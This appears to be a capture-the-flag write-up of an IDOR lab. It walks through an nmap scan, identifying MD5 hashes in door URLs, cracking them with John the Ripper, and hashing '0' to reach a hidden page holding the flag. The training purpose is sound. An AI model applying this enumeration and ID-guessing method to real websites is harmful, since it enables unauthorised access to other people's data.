#### Introduction
You have found yourself in a strange corridor. Can you find your way back to where you came?  

In this challenge, you will explore potential IDOR vulnerabilities. Examine the URL endpoints you access as you navigate the website and note the hexadecimal values you find (they look an awful lot like a _hash_, don't they?). This could help you uncover website locations you were not expected to access.

#### What is IDOR
IDOR (Insecure Direct Object Reference) is a type of web application vulnerability that occurs when a website or application uses user-supplied input to directly access an object without proper access control.

#### Enumeration
```bash
Nmap 7.95 scan initiated Sun Aug  3 17:41:00 2025 as: /usr/lib/nmap/nmap --privileged -p- -A -oN nmap 10.10.87.71
Nmap scan report for 10.10.87.71
Host is up (0.077s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Werkzeug httpd 2.0.3 (Python 3.10.2)
|_http-title: Corridor
|_http-server-header: Werkzeug/2.0.3 Python/3.10.2
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   67.26 ms 10.14.0.1
2   76.92 ms 10.10.87.71

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug  3 17:42:48 2025 -- 1 IP address (1 host up) scanned in 108.43 seconds
```

After the scan is complete, we visited the website and found many doors each with a unique hash value.  We identified the hash type with `hash-identifier` tool.

```bash
hash-identifier                                 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: cfcd208495d565ef66e7dff9f98764da

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Once the hash type is confirmed, we began to decrypt the hash. Before that, we need to save all the hashes in a file.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 enc
Using default input encoding: UTF-8
Loaded 13 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Remaining 10 password hashes with no different salts
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
12               (?)     
11               (?)     
13               (?)     
7                (?)     
10               (?)     
9                (?)     
6                (?)     
5                (?)     
8                (?)     
4                (?)     
10g 0:00:00:00 DONE (2025-08-03 18:54) 15.15g/s 18876Kp/s 18876Kc/s 47724KC/s 4 90227..3xqug55
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

We can see that those hashes were decrypted to numbers. So, to perform the IDOR attack we need to change the numbers and we can start with `0`. Trying the number didn't work, so may be we can try to encrypt the number to md5 hash.

```bash
echo -n '0' | md5sum
```

We get this value `cfcd208495d565ef66e7dff9f98764da`, which is the representation of `0`. When we used this we got the flag.




